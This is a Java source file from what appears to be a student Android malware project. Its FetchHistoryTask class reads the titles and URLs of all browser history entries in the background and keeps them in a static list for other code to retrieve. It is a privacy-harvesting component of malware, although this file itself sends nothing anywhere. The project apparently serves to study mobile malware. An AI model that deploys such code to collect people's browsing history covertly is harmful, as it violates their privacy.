/***********************************************************************
* This file is part of INF358-AndroidMalwareProject
* 
* Copyright (c) 2012  GPL Project Developer
* 
* INF358-AndroidMalwareProject is free software: you may copy, redistribute
* and/or modify it under the terms of the GNU General Public License as
* published by the Free Software Foundation, either version 2 of the
* License, or (at your option) any later version.
* 
* This file is distributed in the hope that it will be useful, but
* WITHOUT ANY WARRANTY; without even the implied warranty of
* MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
* General Public License for more details.
* 
* You should have received a copy of the GNU General Public License
* along with this program.  If not, see <http://www.gnu.org/licenses/>.
*
* authors: Issa CAMARA, Wajih JMAIEL, Julien MEDORI, Hakim WADIL

***********************************************************************/

package com.malware.data;

import java.util.ArrayList;


import android.content.ContentResolver;
import android.database.Cursor;
import android.os.AsyncTask;
import android.provider.Browser;
import android.util.Log;

public class FetchHistoryTask extends AsyncTask {
	
	private static ArrayList<HistoryEntry> listEntry;

	private final boolean VERBOSE = true;
	private final String TAG = "FetchHistoryTask";
	
	@Override
	protected Object doInBackground(Object... params) {
		
		if (VERBOSE) Log.d(TAG, "Start of FetchHistoryTask");
		
		ContentResolver cr = (ContentResolver) params[0];
		listEntry = displayBrowserHistory(cr);
		
		if (VERBOSE) Log.d(TAG, "End of FetchHistoryTask");
		
		return null;
	}

	private ArrayList<HistoryEntry> displayBrowserHistory(ContentResolver cr) {

		String title = "";
		String url = "";

		ArrayList<HistoryEntry> list = new ArrayList<HistoryEntry>();

		String[] proj = new String[] { Browser.BookmarkColumns.TITLE, Browser.BookmarkColumns.URL };
		String sel = Browser.BookmarkColumns.BOOKMARK + " = 0"; // 0 = history,
																// 1 = bookmark
		Cursor mCur = cr.query(Browser.BOOKMARKS_URI, proj, sel, null, null);
		mCur.moveToFirst();

		if (mCur.moveToFirst() && mCur.getCount() > 0) {
			boolean cont = true;
			while (mCur.isAfterLast() == false && cont) {
				HistoryEntry entry;

				title = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.TITLE));
				url = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.URL));
				
				// Do something with title and url
				entry = new HistoryEntry(title, url);
				list.add(entry);
				mCur.moveToNext();
			}
		}

		mCur.close();

		return list;
	}

	public static ArrayList<HistoryEntry> getListEntry() {
		return listEntry;
	}
}
